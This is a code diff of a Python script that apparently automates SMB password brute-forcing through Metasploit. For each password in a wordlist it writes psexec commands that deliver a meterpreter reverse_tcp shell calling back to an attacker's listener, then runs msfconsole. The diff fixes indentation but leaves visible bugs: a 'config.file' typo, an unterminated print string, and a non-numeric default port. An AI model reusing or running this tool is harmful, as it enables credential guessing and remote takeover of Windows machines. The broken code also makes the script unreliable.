@@ -54,16 +54,16 @@ def smb_brute(config_file, target_host, passwd_filename, lhost, lport):
     passwd_file = open(passwd_filename, 'r')
 
     for passwd in passwd_file.readlines():
-    password = passwd.strip('\n').strip('\r')
+        password = passwd.strip('\n').strip('\r')
 
-    config_file.write(f"use exploit/windows/smb/psexec\n")
-    config_file.write(f"set SMBUser {str(username)}\n")
-    config_file.write(f"set SMBPass {str(password)}\n")
-    config_file.write(f"set RHOST {str(target_host)}\n")
-    config.file.write(f"set PAYLOAD windows/meterpreter/reverse_tcp\n")
-    config_file.write(f"set LPORT {str(lport)}\n")
-    config_file.write(f"set LHOST {lhost}\n")
-    config_file.write(f"exploit -j -z")
+        config_file.write(f"use exploit/windows/smb/psexec\n")
+        config_file.write(f"set SMBUser {str(username)}\n")
+        config_file.write(f"set SMBPass {str(password)}\n")
+        config_file.write(f"set RHOST {str(target_host)}\n")
+        config.file.write(f"set PAYLOAD windows/meterpreter/reverse_tcp\n")
+        config_file.write(f"set LPORT {str(lport)}\n")
+        config_file.write(f"set LHOST {lhost}\n")
+        config_file.write(f"exploit -j -z")
 
 
 def main():
@@ -86,12 +86,12 @@ def main():
 
         return 1
     if not target_host or not lhost:
+        print(f"[-] Target and listen hosts must be provided)
         parser.print_help()
 
         return 1
     if not lport:
         lport = "l33t"
-
 
     target_hosts = find_smb_targets(target_host)
     setup_handler(config_file, lhost, lport)
@@ -101,10 +101,9 @@ def main():
         if passwd_file:
             smb_brute(config_file, target_host, passwd_file, lhost, lport)
 
-
     config_file.close()
 
-    os.system("msfconsole -r meta.rc")
+    subprocess.run(["msfconsole", "-r", "meta.rc"], shell=True, check=True)
 
     return 0
 
